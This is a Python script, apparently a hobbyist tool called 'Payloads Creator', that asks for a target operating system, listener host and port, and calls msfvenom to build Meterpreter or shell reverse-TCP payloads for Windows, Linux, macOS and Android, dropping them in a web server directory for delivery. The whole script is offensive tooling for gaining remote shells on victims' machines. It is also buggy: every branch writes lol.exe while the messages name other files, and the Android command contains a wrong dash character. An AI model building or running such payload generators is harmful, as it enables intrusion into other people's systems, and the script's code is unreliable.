import os

print("""
------Payloads Creator script (Pirat_Blinders)------
enter your target system 
1.android
2.linux
3.mac
4.windows
""")

system_type = input("Enter your target system : ")
while system_type == "":
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    system_type = input("Please, enter your target system : ")

if system_type.lower() not in ("android","mac","windows","linux"):
    print("""
    Please enter just on of those systems :
    1.android
    2.linux
    3.mac
    4.windows
    rerun the tool and try again :)
    """)
    exit(0)

lhost = str(input("Enter your local host : "))
while lhost == "":
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    lhost = str(input("Please, enter your local host : "))

lport = str(input("Enter your port to use : "))
while lport == "":
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    lport = str(input("Please, enter your port to use : "))

if system_type == "windows":
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > /var/www/html/lol.exe".format(lhost,lport))
    print("[+] You will find you payload here : /var/www/html/lol.exe ")

elif system_type == "linux":
    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > /var/www/html/lol.exe".format(lhost,lport))
    print("[+] You will find you payload here : /var/www/html/lol.elf ")

elif system_type == "mac":
    os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > /var/www/html/lol.exe".format(lhost,lport))
    print("[+] You will find you payload here : /var/www/html/lol.macho ")

elif system_type == "android":
    os.system("msfvenom –p android/meterpreter/reverse_tcp LHOST={0}  LPORT={1} -f apk > /var/www/html/lol.exe".format(lhost,lport))
    print("[+] You will find you payload here : /var/www/html/lol.apk ")
else:
    print("something goes wrong !!!!")
    print("Make sure your inputs are right and try again with reruning the script :) ")
    exit(0)

